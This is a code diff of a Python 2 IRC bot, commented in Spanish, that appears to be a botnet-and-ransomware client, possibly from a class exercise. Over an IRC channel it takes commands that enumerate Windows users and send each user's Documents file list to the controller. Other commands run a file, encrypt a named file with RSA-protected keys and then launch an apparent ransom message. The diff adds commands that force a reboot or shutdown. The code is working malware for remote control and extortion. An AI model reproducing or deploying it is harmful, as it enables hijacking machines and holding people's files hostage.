@@ -86,37 +86,71 @@ def CifraLlave(llave):
 	return rsa.encrypt(llave,32)
 
 def botName():
-    values = list("123456789")
-    L1=random.choice(values)
-    L2=random.choice(values)
-    L3=random.choice(values)
-    L4=random.choice(values)
+	"""
+	Funcion que crea un nombre aleatorio cada vez que se une un Bot al canal
+	"""
+	values = list("123456789")
+	L1=random.choice(values)
+	L2=random.choice(values)
+	L3=random.choice(values)
+	L4=random.choice(values)
 
-    name = "Bot"+ L1 + L2 + L3 + L4
-    return name
+	name = "Bot"+ L1 + L2 + L3 + L4
+	return name
 
 def users():
-    usersDir = os.listdir('C:\\Users')
-    userDefault = ('All Users','Default','Default User','DefaultAppPool','Public','desktop.ini')
-    users = []
-    for element in usersDir:
-        if element not in userDefault:
-            users.append(element)
-            print element
-    return users
+	"""
+	Funcion que lista los usuarios existentes dentro del sistema
+	Devuelve: Una lsta de usuarios
+	"""
+	usersDir = os.listdir('C:\\Users')
+	userDefault = ('All Users','Default','Default User','DefaultAppPool','Public','desktop.ini')
+	users = []
+	for element in usersDir:
+		if element not in userDefault:
+			users.append(element)
+			#print element
+	return users
 
 def files(user):
-    docsPath = "C:\\Users\\"+ user +"\\Documents"
-    docsFiles = os.listdir(docsPath)
-    FilesWithPath = []
-    for file in docsFiles:
-        filePath = docsPath +"\\"+ file
-        FilesWithPath.append(filePath)
-    msg = "Archivos de %s en Documents\n" %user
-    for file in FilesWithPath:
-        msg += file+"\n"
-    print msg
-    return FilesWithPath
+	"""
+	Funcion que devuleve los archivos dentro de la carpeta Documents de un usuario
+	Recibe: Un nombre de usuario
+	Devuelve: Una lista de de archivos
+	"""
+	docsPath = "C:\\Users\\"+ user +"\\Documents"
+	docsFiles = os.listdir(docsPath)
+	FilesWithPath = []
+	for file in docsFiles:
+		filePath = docsPath +"\\"+ file
+		FilesWithPath.append(filePath)
+	msg = "Archivos de %s en Documents\n" %user
+	for file in FilesWithPath:
+		msg += file+"\n"
+	#print msg
+	return FilesWithPath
+
+def keepAlive(msg):
+	"""
+	Funcion que mantiene vivo al Bot cuando no hay actividad
+	Recive: Mensaje del servido
+	Devuelve: Mensaje para seguir dentro del canal
+	"""
+	server = msg.split(" ")[1]
+	response = "PONG "+ server +"\r\n"
+	return response
+
+def reboot():
+	"""
+	Funcion que manda a llamar un subproceso para reiniciar el equipo
+	"""
+	subprocess.call(["shutdown", "-f", "-r", "-t", "1"])
+
+def shutdown():
+	"""
+	Funcion que manda a llamar un subproceso para apagar el equipo
+	"""
+	subprocess.call(["shutdown", "-f", "-s", "-t", "1"])
 
 server="192.168.1.30"
 botnick=botName()
@@ -129,37 +163,46 @@ irc.send("NICK "+ botnick +"\n")
 irc.send("JOIN "+ channel +"\n")
 
 while 1:
-    try:
-        msg=irc.recv(2048)
-        #print(msg)
-    except Exception:
-        pass
-    if msg.find("PING")!=-1:
-        irc.send("PRIVMSG "+channel+" :PONG!\r\n")
-    if msg.find("!@PING")!=-1:
-        irc.send("PRIVMSG "+channel+" :PONG!\r\n")
-    if msg.lower().find("!@hi")!=-1:
-        irc.send("PRIVMSG "+channel+" :Hello!\r\n")
-    if msg.find("!@run")!=-1:
-        subprocess.call(['C:\\test.txt'])
-    if msg.find("!@users")!=-1:
-        users = users()
-        for user in users:
-            irc.send("PRIVMSG "+channel+" %s\r\n" %user)
-    if msg.find("!@files")!=-1:
-        user = msg.split(' ')[4]
-        FilesWithPath = files(user[:-2])
-        for file in FilesWithPath:
-            irc.send("PRIVMSG "+channel+" %s\r\n" %file)
-    if msg.find("!@cifraArchivo") != -1:
-        irc.send("PRIVMSG "+channel+" :Cifrando...\r\n")
-        msg2=msg.split(' ')
 	try:
-	    Cifra(msg2[4].replace('\r\n',''))
-	    irc.send("PRIVMSG "+channel+" :El archivo fue cifrado correctamente ;)\r\n")
-	    proc = subprocess.Popen([sys.executable, "mensaje.py"])
-            proc.communicate()
-        except Exception as e:
-            irc.send("PRIVMSG "+channel+" :"+str(e)+"\r\n")
-    # Limpio el msg
-    msg=""
+		msg=irc.recv(2048)
+		#print(msg)
+	except Exception:
+		pass
+	if msg.find("!@PING")!=-1:
+		irc.send("PRIVMSG "+channel+" :PONG!\r\n")
+	if msg.find("PING")!=-1:
+		response = keepAlive(msg)
+		irc.send(response)
+	if msg.lower().find("!@hi")!=-1:
+		irc.send("PRIVMSG "+channel+" :Hello!\r\n")
+	if msg.find("!@run")!=-1:
+		subprocess.call(['C:\\test.txt'])
+	if msg.find("!@users")!=-1:
+		users = users()
+		for user in users:
+			irc.send("PRIVMSG "+channel+" %s\r\n" %user)
+	if msg.find("!@files")!=-1:
+		user = msg.split(' ')[4]
+		FilesWithPath = files(user[:-2])
+		for file in FilesWithPath:
+			irc.send("PRIVMSG "+channel+" %s\r\n" %file)
+	if msg.find("!@cifraArchivo") != -1:
+		irc.send("PRIVMSG "+channel+" :Cifrando...\r\n")
+		msg2=msg.split(' ')
+		try:
+			Cifra(msg2[4].replace('\r\n',''))
+			irc.send("PRIVMSG "+channel+" :El archivo fue cifrado correctamente ;)\r\n")
+			proc = subprocess.Popen([sys.executable, "mensaje.py"])
+			proc.communicate()
+		except Exception as e:
+			irc.send("PRIVMSG "+channel+" :"+str(e)+"\r\n")
+	if msg.find("!@reboot")!=-1:
+		print "reiniciar"
+		irc.send("PRIVMSG "+channel+" :Reiniciando...\r\n")
+		reboot()
+	if msg.find("!@shutdown")!=-1:
+		print "apagar"
+		irc.send("PRIVMSG "+channel+" :Apagando...\r\n")
+		shutdown()
+	# Limpio el msg
+	msg=""
